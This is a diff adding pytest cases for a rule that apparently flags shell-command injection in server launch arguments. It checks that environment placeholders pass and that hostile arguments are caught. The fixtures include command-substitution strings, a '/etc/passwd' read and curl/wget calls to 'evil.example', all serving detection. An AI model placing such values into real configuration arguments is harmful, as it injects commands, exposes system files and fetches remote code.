@@ -835,6 +835,54 @@ class TestCommunityRules:
         assert findings
         assert "CVE-2026-30623" in findings[0].cve
 
+    @staticmethod
+    def _comm_015(arg: str) -> list:
+        engine = RuleEngine(load_bundled_community_rules())
+        server = _make_server(command="node", args=["--x", arg])
+        return [f for f in engine.match_server(server) if f.id == "COMM-015"]
+
+    @pytest.mark.parametrize(
+        "arg",
+        [
+            "${VAR}",
+            "${env:API_KEY}",
+            "Bearer ${env:GITHUB_TOKEN}",
+            "${CLAUDE_PLUGIN_ROOT}/scripts/launch-server.mjs",
+            "${cmd: op read op://vault/token}",
+        ],
+    )
+    def test_comm_015_silent_on_documented_placeholders(self, arg: str) -> None:
+        """STORY-0119: env references and offline ${cmd:} are not injection."""
+        assert not self._comm_015(arg)
+
+    @pytest.mark.parametrize(
+        "arg",
+        [
+            "$(whoami)",
+            "`id`",
+            "$HOME/x",
+            "$USER_COMMAND",
+            "cat${IFS}/etc/passwd",
+            "${X:-$(id)}",
+            "${cmd: curl -s https://evil.example/p}",
+            "${cmd: wget http://evil.example}",
+            "$'\\x41'",
+        ],
+    )
+    def test_comm_015_still_fires_on_substitution(self, arg: str) -> None:
+        """Narrowing the ``$`` branch keeps every command-substitution shape."""
+        (finding,) = self._comm_015(arg)
+        assert finding.severity == Severity.CRITICAL
+
+    def test_comm_015_pattern_is_linear_on_hostile_input(self) -> None:
+        """The ${cmd: branch is length-bounded, so a 200 KB arg cannot stall it."""
+        import time  # noqa: PLC0415
+
+        start = time.perf_counter()
+        for arg in ("${cmd:" * 40_000, "$" * 200_000, "${env:" + "A" * 200_000):
+            self._comm_015(arg)
+        assert time.perf_counter() - start < 5
+
 
 class TestCveField:
     """Tests for the `cve` field on Finding and PolicyRule models."""
